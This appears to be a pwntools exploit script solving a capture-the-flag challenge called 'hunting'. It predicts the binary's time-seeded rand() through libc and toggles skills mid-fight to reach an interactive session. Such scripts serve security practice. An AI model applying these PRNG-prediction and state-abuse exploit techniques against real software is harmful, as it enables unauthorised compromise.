from pwn import *
from ctypes import *

r = process("./hunting")

def useSkill():
	r.sendline("2")
	clib.rand()
	print r.recvuntil("Skill Activation")
	rv = r.recvuntil("============")
	print rv
	rnd = clib.rand()
	print "rnd : " + hex(rnd)
	rnd = rnd & 3
	print "rnd: " + hex(rnd)

	if rnd == 1: # wind
		r.sendline("3")
	elif rnd == 2: # fire
		r.sendline("2")
	else: # rnd == 0, ice
		r.sendline("1")
	
	return rv

def changeSkill(skill):
	r.sendline("3")
	print r.recvuntil("choice:")
	r.sendline(str(skill))
	print r.recvuntil("choice:")

clib = cdll.LoadLibrary("libc.so.6")
clib.srand(clib.time(0))

print r.recvuntil("Exit")

changeSkill(3) # IceBall

for i in range(20):
	rv = useSkill()
	if "level:4" in rv:
		break

changeSkill(2) # fireball

r.send("2\n")
clib.rand()
rnd = clib.rand() & 3

if rnd == 1: # wind
	r.sendline("3")
elif rnd == 2: # fire
	r.sendline("2")
else: # rnd == 0, ice
	r.sendline("1")

changeSkill(7)
r.send("2\n")

clib.rand()
rnd = clib.rand() & 3

if rnd == 1: # wind
	r.sendline("3")
elif rnd == 2: # fire
	r.sendline("2")
else: # rnd == 0, ice
	r.sendline("1")

changeSkill(2)

sleep(1)

r.send("2\n")
clib.rand()
rnd = clib.rand() & 3

if rnd == 1: # wind
	r.sendline("3")
elif rnd == 2: # fire
	r.sendline("2")
else: # rnd == 0, ice
	r.sendline("1")

changeSkill(7)
r.send("2\n")

clib.rand()
rnd = clib.rand() & 3

if rnd == 1: # wind
	r.sendline("3")
elif rnd == 2: # fire
	r.sendline("2")
else: # rnd == 0, ice
	r.sendline("1")

r.interactive()
